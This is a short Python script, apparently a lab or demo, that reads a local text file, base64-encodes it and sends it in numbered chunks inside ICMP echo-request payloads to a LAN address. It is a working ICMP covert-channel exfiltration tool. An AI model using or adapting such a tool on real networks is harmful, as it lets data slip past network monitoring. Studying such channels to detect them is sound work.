import base64
import time
import os
from scapy.all import IP, ICMP, Raw, send
import zlib

# Function to read the file
def read_file(filename):
    if not os.path.exists(filename):
        raise FileNotFoundError(f"The file {filename} does not exist.")
    with open(filename, 'r') as file:
        return file.read()

# Function to calculate CRC32 checksum
def calculate_crc(data):
    return zlib.crc32(data) & 0xFFFFFFFF

# Function to send data via ICMP
def send_icmp_packet(data, ip_dst, packet_number):
    checksum = calculate_crc(data)
    packet = (
        IP(dst=ip_dst)
        / ICMP(type="echo-request")
        / Raw(load=packet_number.to_bytes(4, byteorder="big") + data + checksum.to_bytes(4, byteorder="big"))
    )
    print(f"Sending packet {packet_number} to {ip_dst}")
    send(packet)

# Main logic
def main():
    filename = "./robotergesetze.txt"  # File to read
    ip_dst = "192.168.1.100"         # Target IP
    packet_size = 1400               # Max ICMP packet size
    
    # Print current directory
    print(f"Current working directory: {os.getcwd()}")
    
    # Read and encode the file
    data = read_file(filename)
    encoded_data = base64.b64encode(data.encode())
    
    packet_number = 1
    while encoded_data:
        current_packet_data = encoded_data[:packet_size]
        encoded_data = encoded_data[packet_size:]
        
        send_icmp_packet(current_packet_data, ip_dst, packet_number)
        
        time.sleep(1)
        packet_number += 1

if __name__ == "__main__":
    main()


